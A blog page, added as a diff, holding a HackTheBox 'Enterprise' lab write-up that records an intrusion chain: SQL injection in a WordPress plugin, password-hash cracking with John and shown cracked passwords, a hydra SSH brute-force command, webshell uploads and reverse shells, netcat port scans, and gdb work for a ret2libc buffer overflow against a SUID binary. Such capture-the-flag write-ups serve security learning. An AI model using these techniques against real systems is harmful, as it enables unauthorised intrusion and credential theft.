@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>[HackTheBox] Enterprise machine writeup (Checkpoint style) - limitedeternity </title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="[HackTheBox] Enterprise machine writeup (Checkpoint style)" />
+<meta property="og:description" content="Legend:  [*] – Info [&#43;] – Progress [-] – No use / Dead end [!] – Important [?] – Maybe useful ========== – Next stage  Files: https://mega.nz/folder/QNFVDa4I#zkNofatfEJfrl2KSw2H-yg
+Checkpoints: [*] 443/tcp: Apache 2.4.25
+[*] Possible hostname: enterprise.local / enterprise.htb
+[&#43;] Username: jeanlucpicard
+[&#43;] Interesting endpoint: /files (Status: 301)
+[&#43;] Interesting file: /files/lcars.zip
+[!] PHP files!
+ [*] Mentions &ldquo;wp-config.php&rdquo;. This is WordPress plugin. Moving to 80/tcp.  ===========
+[*] 80/tcp: Apache 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://limitedeternity.github.io/posts/htb-enterprise-writeup/" />
+<meta property="article:published_time" content="2020-08-17T12:27:10+03:00" />
+<meta property="article:modified_time" content="2020-08-17T12:27:10+03:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[HackTheBox] Enterprise machine writeup (Checkpoint style)"/>
+<meta name="twitter:description" content="Legend:  [*] – Info [&#43;] – Progress [-] – No use / Dead end [!] – Important [?] – Maybe useful ========== – Next stage  Files: https://mega.nz/folder/QNFVDa4I#zkNofatfEJfrl2KSw2H-yg
+Checkpoints: [*] 443/tcp: Apache 2.4.25
+[*] Possible hostname: enterprise.local / enterprise.htb
+[&#43;] Username: jeanlucpicard
+[&#43;] Interesting endpoint: /files (Status: 301)
+[&#43;] Interesting file: /files/lcars.zip
+[!] PHP files!
+ [*] Mentions &ldquo;wp-config.php&rdquo;. This is WordPress plugin. Moving to 80/tcp.  ===========
+[*] 80/tcp: Apache 2."/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:500,100,300" rel="stylesheet">
+
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" /><script src="/js/feather.min.js"></script><script src="/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper post">
+		<div class="header">
+	<h1 class="site-title">limitedeternity </h1>
+	<div class="site-description"><h2>Personal blog</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/limitedeternity" title="GitHub"><i data-feather="github"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Main</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post-header">
+			<h1 class="title">[HackTheBox] Enterprise machine writeup (Checkpoint style)</h1>
+			<div class="meta">Posted at &mdash; Aug 17, 2020</div>
+		</div>
+
+		<div class="markdown">
+			<h2 id="legend">Legend:</h2>
+<ul>
+<li><code>[*]</code> – Info</li>
+<li><code>[+]</code> – Progress</li>
+<li><code>[-]</code> – No use / Dead end</li>
+<li><code>[!]</code> – Important</li>
+<li><code>[?]</code> – Maybe useful</li>
+<li><code>==========</code> – Next stage</li>
+</ul>
+<h2 id="files">Files:</h2>
+<p><a href="https://mega.nz/folder/QNFVDa4I#zkNofatfEJfrl2KSw2H-yg">https://mega.nz/folder/QNFVDa4I#zkNofatfEJfrl2KSw2H-yg</a></p>
+<h2 id="checkpoints">Checkpoints:</h2>
+<p><code>[*]</code> <strong>443/tcp</strong>: Apache 2.4.25</p>
+<p><code>[*]</code> Possible hostname: <strong>enterprise.local</strong> / <strong>enterprise.htb</strong></p>
+<p><code>[+]</code> Username: <strong>jeanlucpicard</strong></p>
+<p><code>[+]</code> Interesting endpoint: <strong>/files</strong> (Status: 301)</p>
+<p><code>[+]</code> Interesting file: <strong>/files/lcars.zip</strong></p>
+<p><code>[!]</code> PHP files!</p>
+<ul>
+<li><code>[*]</code> Mentions &ldquo;wp-config.php&rdquo;. This is WordPress plugin. Moving to <strong>80/tcp</strong>.</li>
+</ul>
+<p><code>===========</code></p>
+<p><code>[*]</code> <strong>80/tcp</strong>: Apache 2.4.10 + WordPress 4.8.1</p>
+<p><code>[*]</code> X-Powered-By: PHP/5.6.31</p>
+<p><code>[-]</code> Unusual header &ldquo;Link&rdquo;: <a href="http://enterprise.htb/index.php?rest_route=/">http://enterprise.htb/index.php?rest_route=/</a></p>
+<p><code>[-]</code> Themes:</p>
+<ul>
+<li>twentyfifteen 1.8</li>
+<li>twentysixteen 1.3</li>
+<li>twentyseventeen 1.3</li>
+</ul>
+<p><code>[-]</code> plugins:</p>
+<ul>
+<li>akismet</li>
+</ul>
+<p><code>[?]</code> XML-RPC is enabled.</p>
+<p><code>[?]</code> Found mentions about &ldquo;Wordpress &lt;= 4.8.2 SQL Injection&rdquo;</p>
+<ul>
+<li><code>[?]</code> Requires access to admin dashboard</li>
+</ul>
+<p><code>[?]</code> CVE-2017-14723</p>
+<ul>
+<li><code>[*]</code> Before version 4.8.2, WordPress mishandled % characters and additional placeholder values in $wpdb-&gt;prepare, and thus did not properly address the possibility of plugins and themes enabling SQL injection attacks.</li>
+</ul>
+<p><code>[+]</code> Username: <code>william.riker</code></p>
+<p><code>[+]</code> lcars plugin:</p>
+<ul>
+<li>Location: <a href="http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php:">http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php:</a></li>
+</ul>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    $query = $_GET[&#39;query&#39;];
+    $sql = &#34;SELECT ID FROM wp_posts WHERE post_name = $query&#34;;
+</code></pre></div><ul>
+<li>Location: <a href="http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php:">http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php:</a></li>
+</ul>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    $query = (int)$_GET[&#39;query&#39;];
+    $sql = &#34;SELECT post_title FROM wp_posts WHERE ID = $query&#34;;
+</code></pre></div><p><code>[!]</code> <code>$_GET['query']</code> in <code>lcars_db.php</code> is vulnerable to SQL injection!</p>
+<p><code>[*]</code> <a href="http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=69">http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=69</a> yields &ldquo;YAYAYAYAY.&rdquo;</p>
+<p><code>[*]</code> <a href="http://enterprise.htb/?p=69">http://enterprise.htb/?p=69</a> is &ldquo;YAYAYAYAY.&rdquo; post.</p>
+<p><code>[-]</code> We won&rsquo;t be able to extract drafted/hidden posts this way. Running SQLmap.</p>
+<p><code>[!]</code> Extracted DBMS system users password hashes.</p>
+<ul>
+<li><code>[+]</code> Cracked them using <a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a></li>
+</ul>
+<p><code>[+]</code> &ldquo;wordpress&rdquo; database:</p>
+<ul>
+<li><code>[+]</code> Extracted <code>william.riker</code>'s password hash.</li>
+<li><code>[+]</code> Found clear-text passwords inside a drafted post.</li>
+</ul>
+<p><code>[+]</code> &ldquo;joomladb&rdquo; database:</p>
+<ul>
+<li><code>[+]</code> Extracted <code>geordi.la.forge</code>'s and <code>guinan</code>'s password hashes.</li>
+</ul>
+<p><code>[+]</code> Building custom password list for JTR and running it against hashes.</p>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>[*]</code> <code>root@parrot# john william.riker.hash -wordlist=passwordlist.txt</code></p>
+</li>
+<li>
+<p><code>[+]</code> Password is: <code>u*Z14ru0p#ttj83zS6</code></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>[*]</code> <code>root@parrot# john geordi.la.forge.hash -wordlist=passwordlist.txt</code></p>
+</li>
+<li>
+<p><code>[+]</code> Password is: <code>ZD3YxfnSjezg67JZ</code></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>[*]</code> <code>root@parrot# john guinan.hash -wordlist=passwordlist.txt</code></p>
+</li>
+<li>
+<p><code>[+]</code> Password is: <code>ZxJyhGem4k338S2Y</code></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<p><code>[+]</code> Logged in as <code>william.riker</code> to <strong>wp-admin/</strong>. Uploading webshell.</p>
+<p><code>[+]</code> Jumped to a reverse TCP shell.</p>
+<p><code>[-]</code> We are inside of Docker container</p>
+<p><code>[*]</code> <strong>/home/user.txt</strong>:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">As you take a look around at your surroundings you realise there is something wrong.
+This is not the Enterprise!
+As you try to interact with a console it dawns on you.
+Your in the Holodeck!
+</code></pre></div><p><code>[-]</code> Trying SSH bruteforce using hydra:</p>
+<p><code>root@parrot# hydra -L users.txt -P passwordlist.txt -e nsr -s 22 -o &quot;/media/psf/Home/Downloads/results/10.10.10.61/scans/tcp_22_ssh_hydra.txt&quot; ssh://10.10.10.61</code></p>
+<p><code>[*]</code> Moving to <strong>8080/tcp</strong>.</p>
+<p><code>===========</code></p>
+<p><code>[*]</code> <strong>8080/tcp</strong>: Apache 2.4.10 + Joomla 3.7.5</p>
+<p><code>[*]</code> X-Powered-By: PHP/7.0.23</p>
+<p><code>[-]</code> <strong>robots.txt</strong> contents:</p>
+<ul>
+<li><code>/joomla/administrator</code></li>
+<li><code>/administrator</code></li>
+<li><code>/bin</code></li>
+<li><code>/cache</code></li>
+<li><code>/cli</code></li>
+<li><code>/components</code></li>
+<li><code>/includes</code></li>
+<li><code>/installation</code></li>
+<li><code>/language</code></li>
+<li><code>/layouts</code></li>
+<li><code>/libraries</code></li>
+<li><code>/logs</code></li>
+<li><code>/modules</code></li>
+<li><code>/plugins</code></li>
+<li><code>/tmp</code></li>
+</ul>
+<p><code>[-]</code> HTTP backups:</p>
+<ul>
+<li><a href="http://10.10.10.61:8080/index.php/2-uncategorised/index.bak">http://10.10.10.61:8080/index.php/2-uncategorised/index.bak</a></li>
+<li><a href="http://10.10.10.61:8080/index.php/2-uncategorised/index%20copy.php/2-uncategorised/1-romulan-ale">http://10.10.10.61:8080/index.php/2-uncategorised/index copy.php/2-uncategorised/1-romulan-ale</a></li>
+<li><a href="http://10.10.10.61:8080/index.php/2-uncategorised/Copy%20of%20index.php/2-uncategorised/1-romulan-ale">http://10.10.10.61:8080/index.php/2-uncategorised/Copy of index.php/2-uncategorised/1-romulan-ale</a></li>
+<li><a href="http://10.10.10.61:8080/index.php/2-uncategorised/Cop%20(2)%20of%20index.php/2-uncategorised/1-romulan-ale">http://10.10.10.61:8080/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/1-romulan-ale</a></li>
+<li><a href="http://10.10.10.61:8080/index.php/2-uncategorised/index.php/2-uncategorised/1-romulan-ale.1">http://10.10.10.61:8080/index.php/2-uncategorised/index.php/2-uncategorised/1-romulan-ale.1</a></li>
+<li><a href="http://10.10.10.61:8080/index.php/2-uncategorised/index.php/2-uncategorised/1-romulan-ale.~1~">http://10.10.10.61:8080/index.php/2-uncategorised/index.php/2-uncategorised/1-romulan-ale.~1~</a></li>
+</ul>
+<p><code>[+]</code> Internal IP Leaked: <strong>172.17.0.3</strong>. I want to do a ping sweep after I get in.</p>
+<p><code>[+]</code> Logged in as <code>guinan</code> to <strong>/</strong>.</p>
+<p><code>[-]</code> No access to <strong>/administrator</strong></p>
+<p><code>[+]</code> Logged in as <code>geordi.la.forge</code> to <strong>/administrator</strong>. Uploading webshell.</p>
+<p><code>[+]</code> Jumped to reverse TCP shell.</p>
+<p><code>[-]</code> We are inside of Docker container</p>
+<p><code>[*]</code> <strong>/home/user.txt</strong>:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">As you take a look around at your surroundings you realise there is something wrong.
+This is not the Enterprise!
+As you try to interact with a console it dawns on you.
+Your in the Holodeck!
+</code></pre></div><p><code>[+]</code> Doing ping sweep:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">www-data@a7018bfdc454:/var/www/html$ for x in $(seq 1 255); do ping -W 1 -c 1 172.17.0.$x | grep from; done
+64 bytes from 172.17.0.1: icmp_seq=0 ttl=64 time=0.081 ms
+64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.292 ms
+64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.081 ms
+64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.181 ms
+</code></pre></div><p><code>[*]</code> There are 4 hosts.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">www-data@a7018bfdc454:/var/www/html$ ./nc -vz 172.17.0.1 1-65535 2&gt;/dev/stdout
+172.17.0.1 22 (ssh) open
+172.17.0.1 80 (http) open
+172.17.0.1 443 (https) open
+172.17.0.1 5355 (hostmon) open
+172.17.0.1 8080 (http-alt) open
+172.17.0.1 32812 open
+</code></pre></div><p><code>[*]</code> <strong>172.17.0.1</strong> seems to be a host</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">www-data@a7018bfdc454:/var/www/html$ ./nc -vz 172.17.0.2 1-65535 2&gt;/dev/stdout
+mysql [172.17.0.2] 3306 (mysql) open
+</code></pre></div><p><code>[*]</code> <strong>172.17.0.2</strong> is a MySQL container (<code>15af95635b7d</code>)</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">www-data@a7018bfdc454:/var/www/html$ ./nc -vz 172.17.0.3 1-65535 2&gt;/dev/stdout
+a7018bfdc454 [172.17.0.3] 80 (http) open
+</code></pre></div><p><code>[*]</code> <strong>172.17.0.3</strong> is a Joomla container. We are here. (<code>a7018bfdc454</code>)</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">www-data@a7018bfdc454:/var/www/html$ ./nc -vz 172.17.0.4 1-65535 2&gt;/dev/stdout
+172.17.0.4 80 (http) open
+</code></pre></div><p><code>[*]</code> <strong>172.17.0.4</strong> is a WordPress container (<code>b8319d86d21e</code>)</p>
+<p><code>[+]</code> Checking what&rsquo;s mounted there.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">www-data@a7018bfdc454:/var/www/html$ mount -l
+/dev/mapper/enterprise--vg-root on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+/dev/mapper/enterprise--vg-root on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+/dev/mapper/enterprise--vg-root on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+/dev/mapper/enterprise--vg-root on /var/www/html type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+/dev/mapper/enterprise--vg-root on /var/www/html/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+</code></pre></div><p><code>[!]</code> <strong>/files</strong> sound familiar, isn&rsquo;t it? Even contents are the same.</p>
+<p><code>[!]</code> We&rsquo;ve seen <strong>/files</strong> endpoint on <strong>443/tcp</strong>. And <strong>443/tcp</strong> is open only on host.</p>
+<p><code>[+]</code> Copied webshell to <strong>/files</strong>.</p>
+<p><code>[+]</code> Jumped to reverse TCP shell.</p>
+<p><code>[+]</code> Got <strong>user.txt</strong>! Proceeding to rooting the box.</p>
+<p><code>============</code></p>
+<p><code>[!]</code> <code>linpeas.sh</code> showed unusual binary <strong>/bin/lcars</strong> which has SUID bit set.</p>
+<p><code>[*]</code> Running <strong>/bin/lcars</strong> asks for access code. Using Cutter to determine it.</p>
+<p><code>[+]</code> The code is: <code>picarda1</code>.</p>
+<p><code>[+]</code> Detected Buffer Overflow vulnerability in &ldquo;Security&rdquo; (<code>4</code>) menu entry.</p>
+<p><code>[+]</code> Protections (their absence):</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">limitedeternity$ checksec -f ../loot/lcars
+    Canary: false
+    CFI: false
+    SafeStack: false
+    Fortify: false
+    Fortified: 0
+    NX: false
+    PIE: DSO
+    Relro: Full
+    RPATH: None
+    RUNPATH: None
+</code></pre></div><p><code>[+]</code> Also, <code>linpeas.sh</code> showed, that ASLR is disabled.</p>
+<p><code>[*]</code> I don&rsquo;t see any interesting addresses to redirect execution flow to. Thus, ret2libc may be the way.</p>
+<p><code>[+]</code> Yes, it is:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@parrot# ldd lcars
+&lt;...&gt;
+libc.so.6 =&gt; /lib32/libc.so.6 (0xf7dbf000)
+&lt;...&gt;
+</code></pre></div><p><code>[+]</code> We&rsquo;ve seen, that <strong>/bin/lcars</strong> listens for input on <strong>32812/tcp</strong>. Moving there.</p>
+<p><code>===========</code></p>
+<p><code>[*]</code> <strong>32812/tcp</strong>: Vulnerable binary</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@parrot# gdb -q ./lcars
+gef➤ break main
+gef➤ run
+Starting program: /media/psf/Home/Downloads/results/10.10.10.61/loot/lcars
+
+Breakpoint 1, 0x56555ca0 in main ()
+
+gef➤ disassemble main_menu
+   &lt;...&gt;
+   0x56555ad7 &lt;+633&gt;:	call   0x565555c0 &lt;__isoc99_scanf@plt&gt;
+   0x56555adc &lt;+638&gt;:	add    esp,0x10
+   0x56555adf &lt;+641&gt;:	sub    esp,0x8
+   0x56555ae2 &lt;+644&gt;:	lea    eax,[ebp-0xd0]
+   0x56555ae8 &lt;+650&gt;:	push   eax
+   0x56555ae9 &lt;+651&gt;:	lea    eax,[ebx-0x2138]
+   0x56555aef &lt;+657&gt;:	push   eax
+   0x56555af0 &lt;+658&gt;:	call   0x56555560 &lt;printf@plt&gt;
+   0x56555af5 &lt;+663&gt;:	add    esp,0x10
+   &lt;...&gt;
+</code></pre></div><p><code>[*]</code> Setting breakpoint right after <code>printf</code>.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gef➤ break *0x56555af5
+gef➤ c
+
+&lt;...&gt;
+
+Enter Security Override:
+AAAAAAAAAAAAAA
+
+Breakpoint 2, 0x56555af5 in main_menu ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+
+&lt;...&gt;
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffcf10│+0x0000: 0x56555ec8  →  &#34;Rerouting Tertiary EPS Junctions: %s&#34; ← $esp
+0xffffcf14│+0x0004: 0xffffcff8  →  &#34;AAAAAAAAAAAAAA&#34;
+0xffffcf18│+0x0008: 0xffffd0c8  →  0xffffd108  →  0xffffd138  →  0x00000000
+0xffffcf1c│+0x000c: 0x56555882  →  &lt;main_menu+36&gt; sub esp, 0xc
+0xffffcf20│+0x0010: 0xffffcf74  →  0x00000000
+0xffffcf24│+0x0014: 0xffffcf70  →  0x00000000
+0xffffcf28│+0x0018: 0x00000003
+0xffffcf2c│+0x001c: 0x00000000
+&lt;...&gt;
+</code></pre></div><p><code>[!]</code> Buffer starts at <strong>0xffffcff8</strong>.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gef➤  info frame
+Stack level 0, frame at 0xffffd0d0:
+ eip = 0x56555af5 in main_menu; saved eip = 0x56555c5f
+ called by frame at 0xffffd110
+ Arglist at 0xffffd0c8, args:
+ Locals at 0xffffd0c8, Previous frame&#39;s sp is 0xffffd0d0
+ Saved registers:
+  ebx at 0xffffd0c4, ebp at 0xffffd0c8, eip at 0xffffd0cc
+</code></pre></div><p><code>[!]</code> EIP is at <strong>0xffffd0cc</strong>.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gef➤  p/d 0xffffd0cc - 0xffffcff8
+$1 = 212
+</code></pre></div><p><code>[!]</code> Length of area we need to overwrite is <strong>212</strong>.</p>
+<p><code>[!]</code> <em>These were machine-independent calculations.</em> Moving to the target machine.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">www-data@enterprise:/var/www/html/files$ gdb -q /bin/lcars
+(gdb) break main
+(gdb) run
+Starting program: /bin/lcars
+
+Breakpoint 1, 0x56555ca0 in main ()
+(gdb) info proc map
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	0x56555000 0x56557000     0x2000        0x0 /bin/lcars
+	0x56557000 0x56558000     0x1000     0x1000 /bin/lcars
+	0x56558000 0x56559000     0x1000     0x2000 /bin/lcars
+	0xf7e11000 0xf7fc5000   0x1b4000        0x0 /lib/i386-linux-gnu/libc-2.24.so
+	0xf7fc5000 0xf7fc7000     0x2000   0x1b3000 /lib/i386-linux-gnu/libc-2.24.so
+	0xf7fc7000 0xf7fc8000     0x1000   0x1b5000 /lib/i386-linux-gnu/libc-2.24.so
+	0xf7fc8000 0xf7fcb000     0x3000        0x0
+	0xf7fd2000 0xf7fd5000     0x3000        0x0
+	0xf7fd5000 0xf7fd7000     0x2000        0x0 [vvar]
+        &lt;...&gt;
+</code></pre></div><p><code>[!]</code> libc is between <strong>0xf7e11000</strong> and <strong>0xf7fc5000</strong>. We need to find an &ldquo;sh&rdquo; string there.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">(gdb) find 0xf7e11000, 0xf7fc5000, &#34;sh&#34;
+0xf7e1f65e
+0xf7e1f6a0
+0xf7e2065b
+0xf7e20c3c
+0xf7e22b30
+0xf7e2346f
+0xf7e23716
+0xf7f6ddd5
+0xf7f6e7e1
+0xf7f70a14
+0xf7f72582
+11 patterns found.
+</code></pre></div><p><code>[!]</code> I&rsquo;ll say that &ldquo;sh&rdquo; is at <strong>0xf7e1f65e</strong>.</p>
+<p><code>[*]</code> Now, we need to pinpoint locations of necessary functions.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0xf7e4c060 &lt;system&gt;
+</code></pre></div><p><code>[!]</code> <code>system</code> function is at <strong>0xf7e4c060</strong>.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">(gdb) p exit
+$2 = {&lt;text variable, no debug info&gt;} 0xf7e3faf0 &lt;exit&gt;
+</code></pre></div><p><code>[!]</code> <code>exit</code> function is at <strong>0xf7e3faf0</strong>.</p>
+<p><code>[+]</code> We&rsquo;re ready to create an exploit now! (<code>exploit/bof.py</code>)</p>
+<p><code>[+]</code> Got <strong>root.txt</strong>!</p>
+
+		</div><div id="disqus_thread"></div>
+<script type="text/javascript">
+	(function () {
+		
+		
+		if (window.location.hostname == "localhost")
+			return;
+
+		var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+		var disqus_shortname = 'limitedeternity';
+		dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
+		Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div><a href="https://github.com/vividvilla/ezhil">Ezhil theme</a> | Built with <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-113901111-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
